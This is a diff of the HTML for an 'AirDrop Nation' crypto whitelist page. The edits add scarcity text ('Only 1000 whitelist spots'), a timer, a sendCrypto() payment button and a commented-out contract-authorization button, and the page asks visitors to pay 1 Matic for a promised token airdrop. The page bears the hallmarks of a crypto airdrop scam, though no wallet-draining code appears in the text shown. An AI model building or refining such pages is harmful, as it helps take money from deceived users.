@@ -43,7 +43,7 @@
       <div class="row gx-4 gx-lg-5 align-items-center hero-block">
         <div id="qrcode" class="col-lg-7">
           <h1>AirDrop Nation</h1>
-          <p id="copy-text" class="text-break copy-text">0xF56Fc333f9962f9d3c0DE0e472C60388bf58bf7c</p>
+          <!-- <p id="copy-text" class="text-break copy-text">0xF56Fc333f9962f9d3c0DE0e472C60388bf58bf7c</p> -->
         </div>
         <div class="col-lg-5">
           <p id="welcome"></p>
@@ -56,8 +56,12 @@
           <p class="text-white m-0 ">Welcome To AirDrop Nation.</p>
           <p class="text-white m-0 ">Click the button below to our whitelist for our airdrop. Registration is only 1 Matic. All participants will receive an airdrop of our next IDO </p>
           <p class="text-white m-0 ">All entries will receive an airdrop of the ADN token.</p>
-          <div class="btn-wrapper">
-            <button class="button-6" id="send-button" disabled>Connect Wallet to Enter Whitelist</button>
+            <p class="text-white m-0 ">Only 1000 whitelist spots will be available</p>
+          <div id="timer3"></div>
+          <div id="middlebuttons" class="btn-wrapper">
+                        <!-- <button class="button-6" onclick="connectContract()"  >Authorize Contract</button> -->
+            <button class="button-6"onclick="sendCrypto()" id="send-button-txt" disabled>Connect Wallet to Enter Whitelist</button>
+        
           </div>
           <p class="text-white m-0 ">In the meantime take a look at the projects being incubated </p>
         </div>
@@ -128,7 +132,7 @@
               <div class="text bg-dark bg-gradient">Comming Soon</div>
             </div>
             <div class="card-footer bg-light bg-gradient">
-              <button class="button-6" role="button" disabled>Comming Soon</button>
+        
             </div>
           </div>
         </div>
@@ -155,6 +159,7 @@
             <div class="card-body image">
               <h2 class="card-title ">Crypto Toolkit</h2>
               <p class="card-text commaSeparated"> This platform will provide to essentual crypto tools to keep in your aeresnal</p>
+                <img width="200" class="img-fluid rounded mx-auto d-block image" src="/assets/cryptotoolkit.png" />
       
       <p class="card-text commaSeparated"> Stay tuned for more information </p>
             </div>
